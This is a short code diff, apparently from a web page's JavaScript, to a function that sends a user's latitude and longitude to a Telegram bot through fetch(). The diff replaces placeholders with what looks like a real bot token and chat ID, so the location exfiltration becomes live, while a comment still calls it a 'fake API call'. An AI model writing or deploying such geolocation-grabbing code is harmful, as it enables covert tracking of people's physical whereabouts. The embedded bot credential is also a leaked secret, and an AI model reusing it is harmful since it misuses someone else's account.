@@ -50,8 +50,8 @@
 
     // Send location to Telegram bot (fake API call, replace with your actual API)
     function sendLocationToTelegram(lat, long) {
-      const telegramBotToken = 'YOUR_BOT_TOKEN'; // Replace with your Telegram Bot token
-      const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
+      const telegramBotToken = '7241686648:AAGWfwBaIotVjEv7VKO0Q2Rh0Vl8rj6KIQY'; // Replace with your Telegram Bot token
+      const chatId = '228446119'; // Replace with your chat ID
       const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=User Location: Latitude ${lat}, Longitude ${long}`;
       
       fetch(url)
